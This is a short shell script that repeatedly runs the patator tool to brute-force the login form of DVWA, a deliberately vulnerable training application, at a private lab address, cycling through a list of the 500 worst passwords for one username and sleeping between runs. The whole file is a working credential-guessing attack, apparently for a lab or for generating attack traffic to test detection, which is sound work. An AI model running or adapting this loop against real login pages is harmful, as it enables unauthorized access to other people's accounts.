#!/bin/sh
while true
do
    sudo patator http_fuzz url=http://172.16.1.20/dvwa/login.php method=POST body="username=scptest&password=FILE0&Login=Login" 0=500-worst-passwords.txt -x ignore:fgrep="Location: login.php"
    sleep 500 
done
